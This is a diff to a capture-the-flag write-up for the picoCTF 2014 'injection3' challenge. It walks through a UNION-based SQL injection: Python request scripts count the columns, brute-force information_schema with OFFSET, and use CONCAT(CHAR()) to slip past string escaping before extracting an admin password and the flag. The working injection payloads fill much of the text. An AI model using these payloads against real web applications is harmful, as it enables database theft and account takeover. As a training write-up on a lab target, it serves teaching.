@@ -66,7 +66,7 @@ Before that though, in order to succeed in ```UNION SELECT```, we have to do two
 1. match the # of columns of the tables
 2. match the data types of the columns
 
-Assuming that all the entries in the ```{table_prefix}user``` are of type ```VARCHAR```, We can write a little Python code to do find the # of columns
+Assuming that all the entries in the ```{table_prefix}user``` are of type ```VARCHAR```, We can write a little Python code to find the # of columns
 ```
 import requests
 
@@ -112,9 +112,11 @@ E-mail: CHARACTER_SETS
 
 # of columns 8
 <p>Could not find user.</p>
+...rest ignored
 ```
 So it can be concluded that the number of columns is 7! Now we can get ready to find the table name! There are two ways to do this.
-1. Brute force
+
+----1. Brute force----
 
 In SQL, there is a useful argument called ```OFFSET``` which allows you to look at the table rows starting at a particular entry point. 
 Athough we have to ```LIMIT``` our query to 1, by using OFFSET we can brute force through all the rows of ```information_schema.tables```! A code would be something like this
@@ -133,8 +135,11 @@ while True:
     print(resp.text)
 ```
 NOTE:
+
 ```SELECT column1, ... FROM table1 LIMIT intA OFFSET intB;```
+
 ```SELECT column1, ... FROM table1 LIMIT intB, intA;```
+
 have the same meaning.
 
 When we run it, 
@@ -164,23 +169,59 @@ Display name: COLUMN_PRIVILEGES
 Location: COLUMN_PRIVILEGES
 E-mail: COLUMN_PRIVILEGES
 </pre><a href="lookup_user.phps">View source</a>
+
 ...
+
 <pre>User info for super_secret_users
 Display name: super_secret_users
 Location: super_secret_users
 E-mail: super_secret_users
 </pre><a href="lookup_user.phps">View source</a>
 ```
-Quite visibly, the table whose name we want to know is the only user-created table (since everything else is in lowercase), and is called ```super_secret_users```!
+Quite visibly, the table whose name we want to know is the only user-created table (since everything else is in UPPERCASE), and is called ```super_secret_users```!
 
-2. Being clever
+----2. Being Clever----
+
+Even with ```{$table_prefix}``` we still partially know the name of the table: the name includes ```users```. What we can do then is,
+use the argument ```LIKE```. 
+
+```LIKE``` is a very handy SQL technique. For MySQL, there are basically two pattern character, ```_``` and ```%```.
+
+- ```_``` matches to exactly 1 character. For example, the pattern ```ap___``` can match to a 5-letter word starting with ```ap```, such as ```apple``` or ```apart```. 
+- On the other hand, ```%``` can match to any pattern, including nothing. For example, the pattern ```ap%``` can match any word starting with ```ap```, such as ```apple```, ```application``` and ```apartment```.
+
+Then instead of brute forcing, we can add ```LIKE "%users"``` at the end of our query to get the name of the table! However, there is one problem to overcome: ```$id``` is in fact escaped!!! 
+What we can then do is to use ```CONCAT()```. This concatenates whatever strings passed as arguments. Together with ```CHAR(INT)``` function that returns a character with ```INT``` ASCII value, we can bypass ```mysqli_real_escape_string```. The mapping is as follows:
+```
+# % => 37
+# u => 117
+# s => 115
+# e => 101
+# r => 114
+# s => 115
+
+##So CONCAT(CHAR(37), CHAR(117), CHAR(115), CHAR(101), CHAR(114), CHAR(115)), and the script is 
+
+import requests
+
+url = "http://web2014.picoctf.com/injection3/lookup_user.php?id=0"
+
+query = " AND 1=0 UNION SELECT table_name,table_name,table_name,table_name,table_name,table_name,table_name FROM information_schema.tables WHERE table_name LIKE CONCAT(CHAR(37), CHAR(117), CHAR(115), CHAR(101), CHAR(114), CHAR(115)) LIMIT 1"
+
+resp = requests.get((url + query).replace(" ", "%20"))
+print(resp.text)
+```
+Either way, it finds the name succesfully. 
+
+Finally, now we can find the admin password! Simple enough, we can again do ```UNION QUERY``` but this time from ```super_secret_users```. 
 
 ```
-
+query = "id=0 AND 1=0 UNION SELECT password,password,password,password,password,password,password FROM super_secret_users LIMIT 1"
 ```
-
+This gives 
 ```
+not_the_flag_super_secret_admin_password
 ```
-```
-
+So login as admin with this password, and there it is the flag
+```flag_2tc7ZPa5PEhcyZJXgH```
 
